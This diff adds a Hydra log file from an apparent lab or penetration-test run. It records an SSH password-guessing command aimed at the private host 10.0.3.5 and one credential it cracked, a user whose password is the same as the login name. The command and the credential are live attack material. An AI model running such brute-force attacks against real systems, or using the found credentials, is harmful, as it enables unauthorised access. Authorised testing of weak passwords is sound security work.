@@ -1,0 +1,2 @@
+# Hydra v9.2 run at 2026-05-17 15:19:22 on 10.0.3.5 ssh (hydra -L users.txt -e nsr -t 4 -I -o hydra_easy.txt ssh://10.0.3.5)
+[22][ssh] host: 10.0.3.5   login: surreta   password: surreta
